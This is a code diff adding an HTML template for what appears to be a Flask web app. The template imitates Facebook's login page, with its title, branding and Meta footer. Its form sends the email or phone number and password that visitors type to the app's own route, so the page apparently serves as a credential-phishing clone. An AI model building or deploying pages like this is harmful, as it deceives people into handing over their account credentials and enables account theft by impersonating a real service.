@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - Log in or Sign Up</title>
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/facebook.css') }}"
+    />
+  </head>
+  <body>
+    <header>
+      <div class="header-text">facebook</div>
+    </header>
+
+    <div class="main-content">
+      <div class="welcome-section">
+        <p class="tagline">
+          Connect with friends and the world around you on Facebook.
+        </p>
+      </div>
+      <div class="login-box">
+        <form
+          method="POST"
+          action="{{ url_for('facebook') }}"
+          onsubmit="return login(event)"
+        >
+          <div class="input-group">
+            <input
+              type="text"
+              id="username"
+              name="username"
+              placeholder="Email or phone number"
+            />
+          </div>
+          <div class="input-group">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Password"
+            />
+            <span class="password-toggle" id="togglePassword">Show</span>
+          </div>
+          <button type="submit" class="login-btn">Log In</button>
+          <a href="#" class="forgot-password">Forgot password?</a>
+          <div class="divider"></div>
+          <button type="button" class="create-account">
+            Create New Account
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <footer>
+      <p>Meta © 2023</p>
+    </footer>
+
+    <script src="{{ url_for('static', filename='js/facebook.js') }}"></script>
+  </body>
+</html>
